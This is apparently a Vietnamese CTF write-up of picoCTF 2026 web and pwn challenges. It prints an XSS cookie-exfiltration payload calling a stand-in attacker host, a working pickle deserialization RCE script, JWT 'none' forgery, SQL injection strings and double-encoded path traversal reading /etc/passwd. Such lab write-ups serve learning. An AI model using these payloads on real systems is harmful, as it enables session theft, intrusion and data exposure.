---  
title: "Picoctf 2026 "  
date: 2026-04-14 +0700  
categories: [CTF, General]  
tags: [General skill, linux, picoctf, picoctf2026, ctf]
---

Trong mini-test này có hai mảng là pwn và web. Trong đó mình đã hoàn thành được các bài:

- Pwn
    - pwn_format_string
- Web 
    - Type_Jugging
    - XSS LEAKS
    - BuyThingsToAlice
    - Auth Gateway - none means all?
    - Note Vault
    - Silent Directory
    - Profile Vault
    - Nimbus Internal Docs

## Pwn/pwn_format_string
Ta sử dụng kĩ thuật format string với định dạng `%p` (%p này sẽ lấy giá trị trong bộ nhớ và hiển thị ra dưới dạng hex) để leak data trong stack.
![image](https://hackmd.io/_uploads/BJbZxST3Wl.png)

Khi thấy có một phần của flag trong stack, ta sử dụng các chuỗi `%p` liên tục để leak thêm data bên trong stack và lấy được toàn bộ flag.
![image](https://hackmd.io/_uploads/rJtwxHTnZx.png)


## Web/Type_Jugging
Theo đề bài, có thể ứng dụng sử dụng logic so sánh `==` . Trong một số ngôn ngữ lập trình, việc sử dụng `==` sẽ ép kiểu hai bên thành một kiểu dữ liệu và so sánh, dẫn đến việc xác thực không chính xác. Ở kiểu hashing **md5** có những kí tự mà khi mã hoá sẽ có dạng 0e.. gọi là **magic hash**, nếu hash của mã nhân viên lưu ở  server có dạng 0e.. và dữ liệu đầu vào cũng là hash dạng 0e.. thì kết quả sẽ bằng nhau dù dữ liệu khác nhau, và đây chính là lỗ hổng **Type Juggling** (giống như tên đề bài gợi ý).
Ví dụ trong PHP, ta có đoạn mã sau xác thực id được lưu dưới dạng **md5**:
```(php)
// user sẽ nhập id và gửi qua POST method
// Ví dụ user nhập id là QNKCDZO khi hash bằng md5 sẽ ra 0e561023235613736034341027246353
$hashed_id = "0e462097431906509019562988736854"
if(hash($_POST['id']) == $hashed_id)){
    echo "Admin accessed. Your token is .....";
}
```
```
Result:
    echo "Admin accessed. Your token is .....";
```
Vậy là attacker hoàn toàn có thể dùng một chuỗi khác để truy cập mà không cần biết id.
Quay lại bài, ta sẽ sử dụng chuỗi `QNKCDZO`, khi hash **md5** sẽ ra `0e830400451993494058024219903391` và so sánh sẽ ra kết quả đúng với hash của mã nhân viên và thành công lấy được flag.
![image](https://hackmd.io/_uploads/S1_0MH62bl.png)

## XSS Leaks
Tại challenge này sẽ có một dạng ứng dụng cho phép nhập tin nhắn, và khi tin nhắn được gửi đi admin của trang web sẽ trực tiếp đọc và kiểm duyệt nội dung tin nhắn đó.
![image](https://hackmd.io/_uploads/Bys4UBa3-l.png)
Khi thử chèn javascript vào phần tin nhắn thì mình thấy ứng dụng có chạy js mà không filter kí tự nào. Vậy đây xảy ra lỗ hổng **XSS**, và ta sẽ dùng **XSS** để lấy thông tin, session của admin và gửi về máy của ta. Mình có thử viết một đoạn payload nhỏ để gửi thông tin về máy.
```(html)
<a src=c onerror="fetch('http://myhackersite.dola?c='+btoa(document.cookie)"></a>
```
Nhưng sau nhiều lần thử với nhiều payload khác nhau, mình lại không thấy admin truy cập vào site của mình.
Sau đó mình thử tìm các endpoint khác trên web thì thấy được endpoint `/admin` , khi truy cập vào  trực tiếp với user bình thường, mình thấy được flag nằm ở trong một hidden field trong source html.
![image](https://hackmd.io/_uploads/S1pCYSanZl.png)
**Thật sự là khá bất ngờ vì flag ở đây =))

## BuyThingsToAlice
Đây là một challenge trang web mua bán hàng online. Khi mở vào thi mình đăng nhập với tài khoản được bài cho sẵn. Đề bài cũng đã gợi ý đây là dạng bài về **Business Logic**. Để lấy được flag thì ta cần một gift card 100,000đ - đổi bằng 1000 điểm **Redeem Points** (mỗi 100 Redeem Points đổi được 10,000đ giftcard) .
![image](https://hackmd.io/_uploads/r1oWABTh-x.png)

Cơ chế nhận **Redeem Points** là khi ta mua một món đồ giá Y ngàn thì sẽ nhận được Y **Redeem Points**, mà tài khoản trong web ta chỉ có 50,000 nên ta chỉ có thể có max 50 point - thiếu 950 point.
![image](https://hackmd.io/_uploads/S14A6S6hZl.png)

Đầu tiên mình có thử **Race Condition** nhưng có vẻ không thành công. Tiếp đó mình để ý đến chức năng refund(Hoàn tiền), khi refund thì số tiền sẽ được hoàn trả 100% trong khi đó thì **Redeem Points** vẫn giữ nguyên, vậy đây chính là lỗ hổng **Business Logic**. Ta chỉ cần liên tục mua và refund thì **Redeem Points** sẽ tăng liên tục và sẽ lấy được flag, để nhanh chóng có thể viết script để liên tục mua và refund.
![image](https://hackmd.io/_uploads/B1gniRSp3bl.png)

![image](https://hackmd.io/_uploads/SJHhRSp2-e.png)

## Auth Gateway - none means all?
Bài này cung cấp cho ta 3 endpoints, sau khi thử các endpoint này, mình có tổng hợp lại được:
- `POST /api/login` - Khi đăng nhập với username và password trả về JWT để xác thực
- `GET /api/me` trả về thông tin của user hiện tại, dùng JWT để xác thực
- `GET /api/admin/flag` trả về flag nếu là admin
Bài cung cấp cho ta một tài khoản, mình sẽ dùng **Burp suite** để gửi thông tin đăng nhập lên endpoint `/api/login`.
![image](https://hackmd.io/_uploads/Sk_0uT62be.png)
Sau khi gửi ta thấy ứng dụng trả về thông báo `"ok":true` chứng tỏ request đã thành công và một JWT để xác thực. Mình decode JWT đó bằng [jwt.io](https://jwt.io)
![image](https://hackmd.io/_uploads/HyOIK66hZg.png)
Ở đây mình sẽ thử kỹ thuật **JWT Algorithm Confusion attacks**. Trong kĩ thuật này ta sẽ thay đổi phần thuật toán ở Header của JWT để ép ứng dụng sử dụng loại mã hoá khác do ta chỉ định. Trong bài này, mình thay thuật toán thành `"none"` (không sử dụng thuật toán mã hoá nào), vậy JWT sẽ không còn phần secret nữa mà chỉ còn header và payload. Ta thay phần payload `role` từ `"user"` thành `"admin"` để truy cập. 
![image](https://hackmd.io/_uploads/rJgGjpph-e.png)
Sau khi tạo JWT, truy cập vào `/api/admin/flag` với JWT đã tạo ta sẽ thành công lấy được flag. 
![image](https://hackmd.io/_uploads/ryyqopa2bg.png)

## Note Vault
Trong bài này ta có một endpoint `/api/note?id={id}` dùng để lấy thông tin note, có thể thử tăng id từ 1 lên để đọc các note khác. Nhưng tại đây, khi ta thử sử dụng một đoạn SQL để chèn vào phần id, ví dụ ` OR 1=1 -- `.
![image](https://hackmd.io/_uploads/r1Ta6pan-x.png)
Tại đây, ta thấy được toàn bộ các note. Vậy ta có thể xác nhận ứng dụng bị lỗ hổng **SQL Injection** và cấu trúc query của ứng dụng như sau 
`SELECT title, content FROM notes WHERE id = `
Tiếp theo ta sẽ sử dụng **Union-based SQL Injection**. 
Đầu tiên để xác định DBMS và version của nó, ta dùng các câu lệnh lấy version của các loại DBMS, sau khi thử mình thành công xác nhận nó là `SQLite` với phiên bản `3.51.2`.
` UNION SELECT sqlite_version(),1`
![image](https://hackmd.io/_uploads/Bk-ieCphZl.png)
Tiếp đó, ta liệt kê bảng và cấu trúc của bảng bằng bảng metadata `sqlite_schema` hoặc `sqlite_master`
`UNION SELECT name, sql FROM sqlite_schema`
![image](https://hackmd.io/_uploads/BkkBZCahZx.png)
Trong đây ta thấy được có hai bảng là notes chứa thông tin về notes và bảng flags là nơi chứa flag mà ta cần tìm.
Đọc bảng flags và lấy được flag.
`1 UNION SELECT * FROM flags`
![image](https://hackmd.io/_uploads/S1obM06hWe.png)

## Profile Vault
Trong bài này ứng dụng cho phép người dùng import và export setting cho profile bằng blob qua 2 enpoint
- `GET /api/export` 
- `POST /api/import`

Vì server chạy bằng python và khi export dữ liệu ở dạng base64 nên ta có thể chắc ứng dụng đã dùng `pickle` cho Serialization và Deserialization. Ở đây ta có một hàm đặc biệt là hàm `__reduce__()`, hàm này sẽ được gọi tự động khi đối tượng được deserialization, đây là lỗ hổng **Insecure Deserialization**. Vậy ta sẽ lợi dụng hàm này để **RCE** và lấy được flag.
Đây là phần code để tạo ra đoạn blob, import blob này vào web và thành công đọc được flag.
(sau khi thử thì mình tìm được flag tại /flag.txt)
```(python)
import pickle
import base64

class Exploit:
    def __ reduce __ (self):
        payload_code = "{{'theme':'light','language': 'en' , 'timezone' : 'UTC' , 'flag|' :__ import __ ('os' ). popen('cat /flag.txt').read()}}"
        return (eval, (payload_code, ))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
```

## Silent Directory
Tại đây ta có một endpoint `GET /api/user-exists?u=` trả về là user có tồn tại hay không.
Vậy ta sẽ sử dụng kỹ thuật **Boolean-based SQL Injection**. 
Trước tiên ta xác định DBMS, sau đó lấy tên bảng và cấu trúc bảng bằng cách brute-force các kí tự với LIKE
`a' UNION SELECT name FROM sqlite_schema WHERE name LIKE 'a%'  – `
Sau khi xác định được có bảng users và secrets ta tiến hành brute-force để đọc bảng secret
`a' UNION SELECT flag FROM secrets WHERE flag LIKE "a%" --`
Để nhanh và tiện nên mình dùng `sqlmap` và thành công lấy được flag. 

## Nimbus Internal Docs
Bài này cho phép ta đọc các tài liệu trên server với các endpoint:
- `GET /` - Trang chủ cống tài liệu.
- ` - Xem bài viết nghiệp vụ theo mã slug.
- `GET /support/tool?asset =< asset_key>` - Giao diện preview cho bộ phận hỗ trợ.
- `GET /support/raw?asset =< asset_key>` - Luồng tích hợp trả nội dung thuần văn bản.

Ở đây qua quan sát ta thấy được `<asset_key>` trong `/support/raw?asset=` chính là đường dẫn file với dạng `kb/<tên file>`. Nhưng web này có cơ chế filter các kí tự lùi foldet như `../`, nhưng có thể bypass filter này bằng kỹ thuật double encoding.
Ta thử đọc file /etc/passswd với payload `%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd` và thành công đọc được có các user nào trong hệ thống.
Tiếp đến mình đọc /proc/self/environ thì xác định được app root là /app và user hiện tại là appuser.
Đến đây mình dạo vòng vo cả server mà không tìm được flag, đến khi có bạn mình gợi ý bruteforce các thư mục trong /app thì mình thành công tìm được flag tại `/app/secret/flag.txt`, dùng double encoding để đọc được flag.
`/support/raw?asset=%252e%252e%252fsecret/flag.txt`
![image](https://hackmd.io/_uploads/H1Tzf1A3be.png)
